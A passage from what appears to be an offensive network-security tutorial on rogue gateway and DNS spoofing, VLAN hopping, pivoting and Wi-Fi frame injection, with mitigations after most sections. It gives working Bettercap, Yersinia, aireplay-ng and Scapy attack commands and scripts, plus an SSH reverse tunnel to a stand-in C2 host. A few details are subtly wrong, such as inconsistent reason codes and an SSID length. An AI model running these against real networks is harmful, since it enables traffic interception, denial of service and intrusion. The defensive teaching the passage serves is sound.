* **The Transparent Pipeline**: If the attacker simply runs the provisioning daemon, the victim will receive the parameters, attempt to connect to an external website, and face an immediate connection failure because the attacker's machine doesn't know where to send the external traffic. The attacker must bind their packet forwarding engine to their external upstream connection, for example a cellular uplink or secondary network card `wlan0`:

```bash
# Enable transit traffic flow in kernel memory
sudo sysctl -w net.ipv4.ip_forward=1
# Masquerade outbound traffic leaving the secondary interface
sudo iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE
```

#### **Tactical Footprint & The Operational Race**
Server mimicry is inherently constrained by network physical topology and race conditions.
* **The Race Condition**: On a network where a legitimate `DHCP`/`DNS` server is still running, server mimicry relies entirely on network proximity and processing speed. Because the `DHCP` protocol is stateless during the discovery phase, the client will accept the configuration from whichever server responds first. Attackers often launch localized Denial of Service/`DoS` conditions against the real infrastructure node to ensure their rogue responses win the race.
* **The Visual Blindspot**: From the victim's perspective, there are zero warning signs. The operating system network tray displays a healthy, connected status. Web pages load at normal speeds because the attacker's machine is efficiently routing the background transit packets.

#### **Technical Comparison of Mimicry Interception Strategies**

| Strategy | Intercepted Vector | Complexity | Primary Operational Risk/OPSEC | Downstream Attack Potential |
| --- | --- | --- | --- | --- |
| Gateway Mimicry | Total egress `IP` traffic (Layers 3 & 4) | High (Requires robust kernel routing/`NAT`) | High bandwidth load can crash the attacker machine | Protocol analysis, `SSL` stripping, full packet capture |
| DNS Mimicry | Domain resolution queries (Layer 7) | Low (Lightweight `UDP` response parsing) | Easily flagged by central endpoint security/`EDR` auditing external `DNS` shifts | Targeted phishing redirects, active site cloning, update hijacking |


### DNS Redirection: Controlling the Name Resolution
`DNS` Redirection/`DNS` Spoofing/Poisoning is an application-layer offensive technique used to alter the mapping between human-readable domain names and logical `IP` addresses.

Once an adversary achieves positioning on the wire, controlling name resolution allows them to selectively divert traffic away from legitimate cloud or enterprise endpoints and redirect it to malicious infrastructure such as cloned phishing portals or credential-harvesting nodes.

#### **Mechanisms of DNS Redirection**
Offensive operators target different layers of the name resolution lifecycle depending on their network position and access levels.
* **In-Path DNS Spoofing/On-the-Wire**: If an attacker already occupies an Adversary-in-the-Middle/`AitM` position via `ARP` spoofing or a rogue gateway, they can intercept raw `UDP` port 53 traffic.
* **Cache Poisoning/DNS Server Targeted**: Instead of targeting individual clients, advanced adversaries target the intermediate caching resolvers such as corporate `DNS` servers or `ISP` nodes.
* **Local Hosts File Modification**: If an adversary has achieved local code execution on an endpoint, they bypass the network entirely by editing the operating system's static lookup tables.

| Interception Vector | Target Layer | Execution Mechanism | Key Technical Hurdle |
| --- | --- | --- | --- |
| **In-Path Spoofing** | Network Wire (`UDP` 53) | Races the legitimate server response | Must match the 16-bit Transaction `ID` (`TXID`) |
| **Cache Poisoning** | Resolver Memory Cache | Floods non-existent subdomain queries | Must guess both the source port and `TXID` |
| **Hosts Modification** | Local File System | Appends direct overrides to static tables | Requires local code execution/write access |

#### **The In-Path Race Condition Lifecycle**

| Sequence | Actor | Action Performed | Network Status |
| --- | --- | --- | --- |
| 1. Query Initiation | Victim Device | Broadcasts standard `DNS` `A` record query | Traffic intercepted by Attacker |
| 2. Malicious Response | Attacker Proxy | Instantly generates forged `DNS` Answer packet | Contains spoofed `IP`; skips upstream lookups |
| 3. Injection Winner | Victim Device | Receives Attacker's packet milliseconds first | Client processes record; discards legitimate packet |
| 4. Legitimate Arrival | Core `DNS` Server | Delivers authentic authoritative response | Late arrival is rejected by victim OS |

#### **Local File Paths for Modification**
When executing local hosts file tampering, the target paths depend entirely on the compromised operating system:
* **Path (Windows)**: `C:\Windows\System32\drivers\etc\hosts`
* **Path (Linux/macOS)**: `/etc/hosts`

Attackers append explicit overrides directly to the file. Because modern operating systems parse the local hosts file before querying network `DNS` servers, lookup queries for that domain are immediately hijacked without generating network-layer telemetry.

#### **Execution Tools: Bettercap and dnsmasq**
Offensive frameworks automate the real-time parsing and forging of `TXIDs` and source ports.
* **Bettercap DNS Spoofing Execution**: Inside `bettercap`, the operator defines a target mapping list using regular expressions and spins up the internal `DNS` responder:

```txt
# 1. Define the spoofing table parameters (Domain -> Attacker IP)
set dns.spoof.domains corporate.com, *.internal.net
set dns.spoof.address 192.168.10.45

# 2. Activate the application-layer engine
dns.spoof on
```

Whenever an intercepted `UDP` port 53 packet matches the `dns.spoof.domains` string, `Bettercap` clones the packet’s internal `TXID`, rewrites the resource record/`RR` fields to point to `192.168.10.45`, and fires it back to the client interface.

#### **Circumventing DNS Redirection: Protocols and Protections**
Legacy `DNS` operates completely in cleartext, making redirection straightforward once network positioning is achieved. Defenders mitigate this risk by enforcing transport-layer integrity and cryptographic validation:
* **DNS over HTTPS/DoH / DNS over TLS/DoT**: Modern operating systems and web browsers encapsulate standard `DNS` queries within encrypted `TLS` tunnels, typically over `TCP` port 443 or 853. Because an `AitM` attacker cannot read or modify the encrypted payload without triggering severe `TLS` certificate validation failures, traditional on-the-wire injection attacks are neutralized.
* **DNSSEC/Domain Name System Security Extensions**: `DNSSEC` adds cryptographic signatures/`RRSIG` to existing `DNS` records. When a client or validating resolver requests a domain mapping, it verifies the signature against a trusted chain of public keys originating from the `DNS` root zone. If an attacker tampers with the `IP` address packet payload, the cryptographic signature fails validation, and the client rejects the record.

---

## VLAN Hopping
### Switch Spoofing: Exploiting DTP Dynamic Trunking
`VLAN` Hopping via Switch Spoofing is an advanced Layer 2 offensive technique that allows an adversary connected to an access port to bypass Virtual Local Area Network/`VLAN` segmentation. By exploiting the default configuration of the Dynamic Trunking Protocol/`DTP`, the attacker tricks a network switch into creating a trunk link.

Once a trunk link is established, the attacker gains direct visibility and access to all `VLAN` traffic passing through that switch, allowing them to pivot into previously isolated network segments without routing through a firewall.

#### **The Vulnerability: Misconfigured DTP**
Dynamic Trunking Protocol/`DTP` is a proprietary Cisco protocol designed to automate the configuration of switch-to-switch links. When two switches are connected, `DTP` negotiates whether the link should operate as a standard access port assigned to a single `VLAN` or a trunk port capable of carrying traffic for multiple `VLANs`.

The primary architectural vulnerability lies in the default switchport states shipped on many legacy or unhardened enterprise switches:
* **Dynamic Auto**: The port is willing to convert the link into a trunk if the device on the other end asks to do so.
* **Dynamic Desirable**: The port actively requests and invites the device on the other end to form a trunk link.

If a network administrator leaves a user-facing access port configured in a Dynamic mode, the port will listen for `DTP` frames from any connected device, including an attacker's laptop.

#### **Step-by-Step Execution: Fabricating the Switch Identity**
To execute switch spoofing, an adversary uses specialized offensive tooling such as `Yersinia`, `scapy`, or `VoIPhopper` to forge Layer 2 protocol messages.
1. **Listening for DTP Broadcasts**: The attacker connects their machine to an enterprise network jack and puts their network interface into promiscuous mode. They listen for inbound `DTP` frames, which are broadcast by default every 30 seconds to the destination `MAC` address `01:00:0C:CC:CC:CC`. Spotting these frames confirms that the switch port is running in a dynamic negotiation state.

2. **Injecting a Desirable Spoof Packet**: The attacker uses a tool like `Yersinia` to craft and inject a malicious `DTP` packet onto the wire.
* **The Payload**: The forged packet contains a `DTP` status code declaring the attacker's machine as a switch operating in Dynamic Desirable or Trunk mode, utilizing `802.1Q` encapsulation.
* **Command Example (Yersinia Interactive Console Mode)**:

```bash
sudo yersinia dtp -G
```

Inside the interface, the operator selects the specific switch interface and launches the "Enable Trunking" attack.

1. **Interface Reconfiguration**: The target switch receives the packet, processes the unauthenticated protocol negotiation, and concludes that a legitimate trunking switch has been plugged into the port. The switch automatically shifts the port configuration from an access state to an `802.1Q` Trunk line.

2. **Accessing the Target VLANs**: The attacker's physical network link is now a trunk line. To exploit this position and interact with an isolated segment, such as `VLAN 10` for the finance department, the attacker creates a local virtual sub-interface on their Linux OS that tags outbound frames with the desired target `VLAN` `ID`.

```bash
# 1. Create a virtual network interface mapped to VLAN 10
sudo ip link add link eth0 name eth0.10 type vlan id 10
# 2. Activate the tagged sub-interface
sudo ip link set dev eth0.10 up
# 3. Request an IP address on the new segment via DHCP
sudo dhclient eth0.10
```

#### **Trunk Link Negotiation and Exploitation Lifecycle**

| Step | Actor | Action Performed | Network/Port Status |
| --- | --- | --- | --- |
| 1. Injection | Attacker Laptop | Fires forged `DTP` Dynamic Desirable frame | Port evaluates dynamic negotiation request |
| 2. Transition | Target Switch | Processes packet and flips mode to trunking | Interface converts instantly to an active `802.1Q` trunk link |
| 3. Sub-Interface | Attacker Laptop | Configures virtual interface `eth0.10` | Prepares local network stack for explicit packet tagging |
| 4. Access | Attacker Laptop | Transmits tagged frames for `VLAN 10` / `VLAN 20` | Traffic passes directly to Finance and Management segments |

#### **Switch Spoofing vs. Double Tagging**
`VLAN` Hopping consists of two completely distinct methods. Operators must choose the appropriate technique based on the switch's defensive posture:

| Metric | Switch Spoofing | Double Tagging (Alternative) |
| --- | --- | --- |
| Primary Mechanism | Tricks the switch into negotiating an active `802.1Q` trunk link via `DTP` exploitation. | Appends two distinct `802.1Q` `VLAN` tags onto a single outbound Ethernet frame. |
| Communication Profile | Full Duplex/Bidirectional. The attacker can send and receive packets across any chosen `VLAN`. | Unidirectional Only. The attacker can send packets into a target `VLAN` but can't hear responses. |
| Prerequisites | The switch port must be left in an unhardened Dynamic configuration. | The attacker must already belong to the network's native, untagged `VLAN`, typically `VLAN 1`. |

#### **Definitive Mitigation: Protocol Hardening**
Because `VLAN` hopping exploits standard behavior within default protocol specifications, perimeter firewalls are completely blind to it. Network engineers must lock down Layer 2 switchport properties directly:
* **Disable DTP Negotiation globally**: All user-facing access ports should have automated negotiation stripped entirely. Network administrators must explicitly define ports as static access links.

```txt
Switch(config-if)# switchport mode access
Switch(config-if)# switchport nonegotiate
```

* **Isolate the Native VLAN**: Secure enterprise deployments ensure that the Native `VLAN` (the `VLAN` assigned to handle untagged traffic on trunk links) is modified away from the default value of `VLAN 1` to an isolated, non-routed dummy `VLAN` `ID`, for example `VLAN 999`.
* **Pruning Trunk Port Scopes**: For legitimate switch-to-switch connections where trunking is required, administrators should implement explicit allow-lists to restrict exactly which `VLAN` `IDs` are permitted to traverse the trunk link, dropping unauthorized tags automatically.


### Double Tagging: Crafting the Nested 802.1Q Header
Double Tagging is a unidirectional Layer 2 `VLAN` hopping technique that allows an attacker to inject packets into a completely isolated `VLAN` without a router or firewall intercepting the traffic. Unlike Switch Spoofing, which exploits dynamic configuration protocols, Double Tagging exploits an inherent structural flaw in how switches process `802.1Q` encapsulation headers on native trunk links.

By nesting a second, malicious `VLAN` tag inside a legitimate one, an attacker forces a switch to unwittingly strip the outer layer and pass the inner packet directly into a restricted segment.

#### **The Core Vulnerability: Native VLAN Processing**
To understand Double Tagging, you have to look at how network switches handle the Native `VLAN` across an `802.1Q` trunk link. By default and for backward compatibility, any frame belonging to the Native `VLAN` (traditionally `VLAN 1`) is transmitted across a switch-to-switch trunk link without an `802.1Q` tag.
* When a switch receives an untagged frame on a trunk, it automatically assumes it belongs to the Native `VLAN`.
* When a switch processes a frame that is tagged with the Native `VLAN` `ID`, it strips that tag off before passing it across the trunk link to keep the traffic untagged.

Offensive operators exploit a critical design flaw: switches only inspect the outermost `802.1Q` tag. They don't look deeper into the frame payload to see if a second tag exists.

#### **Anatomy of the Nested Frame**
To launch the attack, the adversary must be physically connected to an access port assigned to the same `VLAN` that the upstream switch uses as its Native `VLAN`, which is usually `VLAN 1`. The attacker uses packet manipulation libraries to forge a raw Ethernet frame containing two stacked `802.1Q` Virtual LAN headers.

| Frame Type | Header/Tag Layer 1 | Header/Tag Layer 2 | Header/Tag Layer 3 | Data Layer |
| --- | --- | --- | --- | --- |
| **Standard Frame** | Ethernet Header | None | None | Payload |
| **Nested Frame** | Ethernet Header | Outer Tag: `VLAN 1` (Exploit Layer) | Inner Tag: `VLAN 10` (Target Layer) | Payload |

* **Outer 802.1Q Tag/The Exploit Layer**: Hardcoded with the `ID` of the Native `VLAN`. This tag acts as a passport to get the packet through the first switch.
* **Inner 802.1Q Tag/The Target Layer**: Hardcoded with the `ID` of the isolated target segment the attacker wants to hit, such as `VLAN 10` for finance or management.

#### **Step-by-Step Packet Lifecycle**
The mechanical process of how a nested frame traverses a multi-switch architecture relies entirely on hardware parsing errors:

| Step | Actor/Component | Action Performed | Packet Header State |
| --- | --- | --- | --- |
| 1. Generation | Attacker Node | Crafts double-tagged packet and fires it into Switch A | `[Eth] [VLAN 1] [VLAN 10] [Payload]` |
| 2. Parsing | Switch A | Inspects outermost tag (`VLAN 1`) and matches it to native trunk link | `[Eth] [VLAN 1] [VLAN 10] [Payload]` |
| 3. Stripping | Switch A | Strips outer tag because it matches the native domain; forwards across trunk | `[Eth] [VLAN 10] [Payload]` |
| 4. Arrival | Switch B | Receives frame from trunk; outermost tag is now the target segment | `[Eth] [VLAN 10] [Payload]` |
| 5. Delivery | Switch B | Blindly forwards packet out of all ports mapped to target network | Delivery to Victim on `VLAN 10` |

#### **Technical Constraints: The One-Way Street**
While highly effective, Double Tagging has an architectural limitation that operators must account for: it is completely unidirectional. Because the switches automatically strip and route the packet based on physical trunk configurations, there is no structural path for return traffic. When the victim in `VLAN 10` attempts to reply to the attacker's `IP` address, the local gateway or switch reads the reply normally. It realizes the attacker's true `IP` resides back on `VLAN 1`, and attempts to route it through the corporate firewall. The firewall sees the unestablished, anomalous response packet and drops it.
* **Offensive Application**: Because it is blind, adversaries use Double Tagging primarily to deliver unacknowledged, high-impact payloads. Common use cases include launching local Denial of Service/`DoS` attacks against specific servers, or triggering remote exploit payloads like malicious `UDP` or `ICMP` scripts that force a target machine to execute a command or call back out to an external internet C2 server.

#### **Definitive Mitigation: Neutralizing the Native VLAN**
Perimeter defenses can't detect Double Tagging because it happens entirely at the hardware layer between adjacent switches. Defenders must apply strict configuration baselines to local switchports:
* **Isolate and Change the Native VLAN**: Never leave the native network set to the default value of `VLAN 1`. Administrators change the native identifier across all trunk links to an explicit, isolated dummy `VLAN` `ID` such as `VLAN 999` that contains no active users or access ports.

```txt
Switch(config-if)# switchport trunk native vlan 999
```

* **Force Native VLAN Tagging**: Modern switches support a command that forces the switch to explicitly process the Native `VLAN` rather than stripping it. This completely neutralizes the stripping flaw required for the nested packet lifecycle.

```txt
Switch(config)# vlan dot1q tag native
```


### Post-Exploitation: Accessing Segregated Network Zones
Once an adversary establishes initial access on an enterprise endpoint, the primary objective shifts to post-exploitation and breaking out of the initial subnet. Modern enterprise networks isolate sensitive components, such as database environments, industrial control systems/`ICS`, or payment card processing zones/`PCI-DSS`, behind strict firewall boundaries and demilitarized zones/`DMZs`.

To cross these boundaries without triggering access-control alerts, offensive tradecraft relies on exploiting trusted relationships, network tunnels, and identity compromise.

#### **Network Pivoting & Port Forwarding**
If a compromised machine sits on a dual-homed boundary or has explicit firewall rules allowing access to an internal zone, an attacker transforms that machine into a network pivot point.
* **SSH Dynamic Port Forwarding/SOCKS Proxies**: Attackers leverage built-in `SSH` utilities on Linux/Unix endpoints to spin up a local `SOCKS` proxy server. This routes all attacker-driven tools like scanners or exploit payloads transparently through the compromised host's context.

```bash
# Establishes a SOCKS proxy on local port 1080 via the pivot host
ssh -D 1080 -N -f user@pivot-host.corporate.local
```

* **Reverse Port Forwarding**: When an internal endpoint can't accept inbound connections due to network address translation/`NAT` or stateful firewalls, the attacker forces the machine to dial outward to an attacker-controlled command-and-control/`C2` server, mapping internal ports to the external listener.

```bash
# Maps the internal target's RDP port (3389) back to the attacker's server port 4444
ssh -R 4444:internal-target.local:3389 attacker@c2-server.com
```

* **Chaining Tools**: Modern `C2` frameworks utilize utilities like `Chisel` or `Ligolo-ng` to create reverse tunnels encapsulated inside standard `HTTP`/`HTTPS` or WebSockets traffic. This easily passes through outbound web proxies while carrying raw `TCP`/`UDP` packets into segregated subnets.

#### **Session & Token Hijacking in Cloud-Adjacent Zones**
In hybrid architectures, accessing segregated zones doesn't always require network-level routing. Instead, adversaries target the control plane using identity infrastructure.
* **SSO and Federated Trust Abuse**: If a segregated zone relies on a central Identity Provider/`IdP` via `SAML` or `OIDC`, an attacker who compromises the central `IdP` or steals a high-privilege session token from an admin browser can generate forged authentication claims. This grants them authorized access to the segregated portal through the front door, bypassing traditional network segment boundaries entirely.
* **Impersonating Automation Accounts**: Administrators often leave highly permissive `API` keys, service principal secrets, or managed identity tokens stored in cleartext scripts on dev machines. Attackers harvest these keys to authenticate straight to the segregated zone's `API` endpoints or management planes, such as Azure Resource Manager or AWS `IAM`.

#### **Living off the Land for Lateral Discovery**
To locate the exact entry points into restricted zones without generating noisy port-scanning alerts, adversaries use native administrative tools already trusted by the operating system.
* **Active Directory Queries**: Windows environments use Active Directory to manage network permissions. Attackers query `AD` using built-in PowerShell or `.NET` classes to map out cross-forest trusts, identify high-value targets, and uncover misconfigured group policies that bridge segregated domains.
* **Network Session Hunting**: Attackers run native commands like `netstat -ano` or `arp -a` to view active connections on the compromised machine. If a system administrator regularly connects to a restricted database zone from that specific endpoint, the active or cached network socket points the attacker directly to the restricted zone's `IP` gateway.

#### **Technical Comparison of Pivoting Methodologies**

| Pivot Strategy | Primary Mechanism | Traffic Profile | Detection Profile | Main Risk to Attacker |
| --- | --- | --- | --- | --- |
| **SOCKS Proxy** | Dynamic port allocation via `SSH`/`Chisel` | High volume, encrypted payload | High (Triggers anomalous inbound/outbound connection logs) | Proxy stability under heavy scanning loads |
| **Reverse SSH Tunnel** | Outbound tunnel creation from victim to `C2` | Persistent single connection | Moderate (Flagged by long-duration beaconing telemetry) | Endpoint termination kills the path |
| **Identity Impersonation** | Using valid `API` keys / Session cookies | Blends with standard administrative logins | Low (Requires behavior-based user analytics to catch) | Token expiration or rapid revocation |

#### **Architectural Defensive Countermeasures**
Standard perimeter defenses fail when the compromise originates inside the corporate firewall. Securing restricted zones requires structural network shifts:
* **Microsegmentation**: Deploying host-based or hypervisor-level software-defined firewalls that isolate workloads individually ensures that even if Host A on a subnet is compromised, it is programmatically barred from communicating with Host B on the exact same subnet without explicit validation.
* **Zero Trust Network Access/ZTNA**: `ZTNA` completely strips networks of inherent trust. Devices are never granted wide-open access to a zone. Instead, every single application request is verified dynamically based on device compliance, user identity, contextual behavior, and cryptographic authorization tokens before access is granted to a micro-service.

---

## Packet Injection Basics
### Monitor Mode and Packet Crafting: Scapy and Aireplay-ng
Packet Injection is an offensive technique where an adversary manually crafts and transmits custom network frames directly onto a communication medium, whether wired or wireless. Unlike standard network activity, where the operating system handles packet structure automatically, manual packet injection allows attackers to bypass protocol constraints.

In wireless security assessments (`802.11`), this tradecraft requires placing the physical wireless interface into Monitor Mode to break default driver restrictions before utilizing automation tools like `Scapy` and `Aireplay-ng` to execute injections.

#### **The Gateway to the Airwaves: Monitor Mode**
By default, a wireless network interface card/`NIC` operates in Managed Mode. In this state, the card only processes frames explicitly addressed to its own `MAC` address or global broadcasts, ignoring all other local airwave traffic. Furthermore, the firmware forces the card to adhere strictly to the `802.11` state machine; you cannot transmit a packet unless you are fully authenticated and associated with an Access Point/`AP`.

To bypass these hardware and driver restrictions, adversaries shift the `NIC` into Monitor Mode/`RFMON`. This instructs the wireless card to capture every single raw radio wave frame passing through its physical antenna, regardless of destination `MAC`, `SSID`, or encryption status. Crucially, Monitor Mode allows the raw injection of frames at Layer 2 without requiring any prior association or cryptographic handshake with the target network.
* **The Command Sequence (Airmon-ng)**: Using the `aircrack-ng` suite, an operator terminates background OS management daemons that might attempt to reset the wireless interface, then flips the operational state:

```bash
# 1. Kill background network managers (wpa_supplicant, NetworkManager)
sudo airmon-ng check kill
# 2. Convert the interface (wlan0) into monitor mode (wlan0mon)
sudo airmon-ng start wlan0
# 3. Lock the card to a specific target channel (e.g., Channel 6)
sudo iwconfig wlan0mon channel 6
```

#### **High-Velocity Injection: Aireplay-ng Execution**
Once monitor mode is established, `Aireplay-ng` is used for high-velocity, structured packet injection. It specializes in generating protocol-specific denial of service/`DoS` states or driving up traffic volume to capture cryptographic handshakes.
* **Deauthentication Attacks**: The most common application is forcing a client to disconnect from an `AP`. Because `802.11` management frames are traditionally unencrypted, an attacker can spoof the identity of the `AP` and send a teardown command directly to the client.

```bash
# Execute a continuous deauthentication attack
sudo aireplay-ng --deauth 0 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon
```

* **Breaking Down the Flags**:
  * **--deauth 0**: The injection module. The `0` instructs the tool to loop the attack infinitely.
  * **-a 00:11:22:33:44:55**: The `BSSID` (`MAC` address) of the legitimate Access Point.
  * **-c AA:BB:CC:DD:EE:FF**: The `MAC` address of the specific target client device.
  * **wlan0mon**: The monitor mode interface handling the raw radio injection.

#### **Programmatic Packet Crafting: Scapy Architecture**
While `Aireplay-ng` handles pre-built attack loops, `Scapy` (a powerful Python-based packet manipulation library) allows an adversary to build entirely bespoke packets from scratch, layer by layer. `Scapy` utilizes the `/` operator to stack protocols sequentially down the network model.
* **Crafting a Custom 802.11 Beacon Frame**: To simulate a fake wireless network (Server Mimicry) over the airwaves, an operator can stack an `802.11` `RadioTap` header, a Management frame header, a Beacon frame configuration, and specific network parameters (`IE` tags):

```python
from scapy.all import *
# 1. Define the physical layer attachment
radio = RadioTap()
# 2. Craft the 802.11 Management Layer (Type 0, Subtype 8 = Beacon)
# addr1 = Broadcast, addr2 = Source (Fake AP), addr3 = BSSID (Fake AP)
dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", 
              addr2="00:de:ad:be:ef:00", addr3="00:de:ad:be:ef:00")
# 3. Define the capability information inside the Beacon frame
beacon = Dot11Beacon(cap="ESS+privacy")
# 4. Append Information Elements (IE) like the Network Name (SSID)
essid = Dot11Elt(ID="SSID", info="Malicious_Corporate_Wi-Fi", len=26)
# 5. Stack the entire frame layer by layer
packet = radio / dot11 / beacon / essid
# 6. Inject the frame out of the monitor mode interface 100 times
sendp(packet, iface="wlan0mon", count=100, inter=0.1)
```

#### **Structural Comparison: Scapy vs. Aireplay-ng**

| Metric | Aireplay-ng | Scapy (Python Library) |
| --- | --- | --- |
| **Execution Speed** | Extremely High (Compiled C; optimized for high-packet saturation) | Moderate (Interpreted Python; limited by execution runtime processing) |
| **Flexibility** | Low (Restricted to specific hardcoded wireless attack vectors) | Infinite (Can modify any bit or header value across any protocol) |
| **State Tracking** | Automated (Handles automated response timing loops out-of-the-box) | Manual (The operator must explicitly program how to listen for and handle return states) |
| **Primary Use Case** | Wireless deauthentication, traffic injection, packet replaying | Prototyping exploits, fuzzing network stacks, bespoke traffic emulation |

#### **Architectural Defensive Countermeasures**
Standard network firewalls are oblivious to Layer 2 wireless injections because the traffic never hits a wired routing node. Protection must be enforced at the local airwave infrastructure layer:
* **802.11w/Protected Management Frames (PMF)**: This security standard cryptographically encrypts and signs wireless management frames like deauthentication packets. If an attacker attempts to inject a spoofed deauth frame without holding the network's master session keys, the client drops the packet, completely neutralizing `Aireplay-ng` attacks.
* **Wireless Intrusion Prevention Systems/WIPS**: Enterprise-grade `APs` constantly scan the radio spectrum for behavioral anomalies. If a `WIPS` detects an influx of deauthentication loops, mismatched `RadioTap` signatures, or thousands of randomized beacon frames emitting from a single unmanaged physical coordinate, it automatically flags the location of the rogue attacking device.


### Frame Manipulation: Forging Wireless Management Frames
Forging wireless management frames is a precise Layer 2 exploitation technique that manipulates the unauthenticated nature of legacy `802.11` protocols. Because management frames control the operational state of a wireless station, handling actions like discovery, association, and teardown, the ability to forge them gives an adversary control over a client's connectivity.

By crafting and injecting custom management payloads via an interface in Monitor Mode, attackers can force targeted disconnections, manipulate client roaming, or map an enterprise's physical asset distribution.

#### **The Operational Target: 802.11 Frame Subtypes**
In the `802.11` specification, every frame starts with a Frame Control field containing a Type and a Subtype bitmask. Management frames are designated as Type 0. The specific structural behavior of the frame is determined by its Subtype value:
* **Subtype 8/Beacon Frame**: Broadcast constantly by Access Points/`APs` to announce their existence, capabilities such as `WPA3` or `WEP` encryption support, and supported data rates.
* **Subtype 10/Disassociation Frame**: A notification sent from an `AP` to a client, or vice versa, stating that the current wireless relationship is being terminated.
* **Subtype 12/Deauthentication Frame**: A higher-priority, abrupt command sent to immediately tear down the secure session, forcing the client back into an unauthenticated state.

#### **The Structural Anatomy of a Forged Management Packet**
When an attacker uses tools like `Scapy` to construct a raw management packet on the wire, they must meticulously spoof three critical `MAC` address fields within the `MAC` Header at Layer 2 to bypass basic client processing checks.

| Frame Component | Field Target | Operational Purpose |
| --- | --- | --- |
| **RadioTap Header** | Physical Metrics | Appends physical layer metadata required for transmission |
| **Dot11 Header (Address 1)** | Destination `MAC` | Set to the victim's card `MAC`, or `ff:ff:ff:ff:ff:ff` for global broadcasts |
| **Dot11 Header (Address 2)** | Source `MAC` | Spoofed to match the `BSSID` (`MAC` address) of the legitimate `AP` |
| **Dot11 Header (Address 3)** | `BSSID` Tracking | Matches the `BSSID` of the `AP` to bypass firmware verification checks |
| **Dot11Subtype Engine** | Deauth / Beacon | Defines the explicit frame action via specific subtype bits |
| **Information Elements** | Payload Tags | Appends required protocol fields like network names or reason codes |

#### **Execution Tradecraft: Common Management Exploits**
* **Forced Disconnection/The Deauth Loop**: The most common application is a forced teardown. The attacker injects a continuous loop of Subtype 12 frames containing a hardcoded Reason Code, such as Reason 7 which stands for Class 3 frame received from nonassociated station. The client receives the packet, believes it originated from the legitimate corporate router, and instantly flushes its local encryption keys, breaking the connection.
  * **Offensive Objective**: Forcing a target off a secure corporate network to trick them into connecting to a high-signal Evil Twin `AP`, or forcing a client to execute a fresh 4-way cryptographic handshake to capture the hash offline.
* **Beacon Flooding/Airwave Saturation**: Attackers can rapidly forge thousands of unique Subtype 8 Beacon frames, each with a different randomized `BSSID` and randomized `SSIDs`, for example broadcasting 500 fake networks named `Corporate_Guest_WiFi`.
  * **Offensive Objective**: Saturation crashes or freezes local site-survey tools, creates a local Denial of Service/`DoS` by filling the victim's UI network selection dropdown menu with thousands of bogus options, and masks the presence of an active rogue access point.

#### **Technical Blueprint: Crafting a Raw Deauth via Python**
To demonstrate how these values stack programmatically, this custom Python snippet constructs a raw, unauthenticated teardown packet using `Scapy`:

```python
from scapy.all import *
# 1. Define physical injection metadata (RadioTap)
physical_layer = RadioTap()
# 2. Forge the MAC layer: Type 0 (Mgmt), Subtype 12 (Deauth)
# Spoofing the AP as the source (addr2) and targeting the victim (addr1)
mac_layer = Dot11(type=0, subtype=12, 
                  addr1="AA:BB:CC:DD:EE:FF",  # Victim MAC
                  addr2="00:11:22:33:44:55",  # Legitimate AP MAC
                  addr3="00:11:22:33:44:55")  # BSSID Identifier
# 3. Append the explicit Reason Code (Reason 7 = Deauthenticated due to inactivity)
payload_layer = Dot11Deauth(reason=7)
# 4. Stack and transmit the raw frame structure out of the monitor mode interface
forged_frame = physical_layer / mac_layer / payload_layer
sendp(forged_frame, iface="wlan0mon", count=50, inter=0.05)
```

#### **Architectural Mitigations: Cryptographic Signing**
Traditional `802.11` legacy networks transmit all management traffic in plain cleartext without any signature validation. Modern enterprise environments eliminate this attack vector entirely by implementing infrastructure-wide hardening:
* **802.11w/Management Frame Protection (MFP)**: This standard adds a new element called the Message Integrity Check/`MIC` to management traffic. When `802.11w` is enabled, and it is mandatory on all `WPA3` deployments, the `AP` and client negotiate a temporary key during the initial handshake. All subsequent deauthentication and disassociation frames are cryptographically signed. If an attacker injects a spoofed deauth frame, the client checks the `MIC` signature, realizes it is invalid, and silently drops the packet without disconnecting.


### Disassociation Attacks: Forcing Re-Authentication
Disassociation attacks are a precise type of Layer 2 wireless denial-of-service/`DoS` technique that targets Subtype 10 management frames. While highly similar in outcome to a deauthentication attack, disassociation operates differently within the `802.11` state machine.

Instead of completely severing the authentication relationship, a disassociation packet tears down the current active communication session (the association), forcing the victim client to instantly execute a re-authentication and re-association handshake to regain network access.

#### **The 802.11 State Machine Context**
To understand why an attacker chooses a disassociation attack over a deauthentication attack, you have to look at the three primary structural states of a wireless connection:
* **State 1**: Unauthenticated and Unassociated.
* **State 2**: Authenticated but Unassociated.
* **State 3**: Authenticated and Associated (Traffic can pass).

A Deauthentication Attack violently kicks a device all the way back to State 1. The device must redo the initial authentication steps from scratch.

A Disassociation Attack only reverts the device back to State 2. The device retains its authenticated status with the Access Point/`AP` but loses its wireless communication channel. This forces the device to instantly fire off an immediate, automated re-association request to restore State 3.

#### **Offensive Tradecraft Objectives**
Adversaries don't execute disassociation loops simply to disrupt internet connectivity; they use the predictable client response to achieve specific downstream tactical goals.
* **Driving WPA2/WPA3 Handshake Captures**: When a victim device is disassociated and drops to State 2, it immediately executes a re-authentication and re-association sequence, which includes exchanging the `EAPOL` 4-Way Handshake. Attackers sitting in monitor mode capture these handshake packets out of the airwaves to crack the network's Pre-Shared Key/`PSK` offline using brute-force tools like `hashcat`.
* **Forcing a Pivot to an Evil Twin Access Point**: If an attacker deploys a rogue Evil Twin access point broadcasting the identical `SSID` name but with a stronger physical signal than the corporate `AP`, the victim device will stay locked onto the legitimate infrastructure by default. By injecting a targeted disassociation packet, the attacker cuts the current active session. When the victim's OS scans the airwaves to re-associate, it spots the attacker's stronger rogue clone and connects to it instead.
* **Stripping Enterprise PMK Caches**: In enterprise `802.1X` environments (WPA-Enterprise), systems utilize Pairwise Master Key/`PMK` caching to let roaming users hop between different office `APs` without prompting them to type their credentials every time. Forcing a disassociation can disrupt this cache handshake logic, tricking specific operating systems into dropping back to generic legacy protocols or exposing authentication exchange parameters.

#### **Execution Blueprint: Automated Disassociation via Scapy**
To inject a disassociation frame, the adversary spoofs the `MAC` address of the Access Point (Address 2 and 3) and addresses the packet directly to the victim (Address 1), appending the specific Subtype 10 flag.

```python
from scapy.all import *
# 1. Attach the standard hardware RadioTap layer
radio_tap = RadioTap()
# 2. Forge the MAC layer: Type 0 (Management), Subtype 10 (Disassociation)
# addr1 = Destination Victim, addr2 = Source AP, addr3 = BSSID of the AP
mac_layer = Dot11(type=0, subtype=10, 
                  addr1="CC:CC:CC:DD:EE:FF",  # Victim Machine MAC
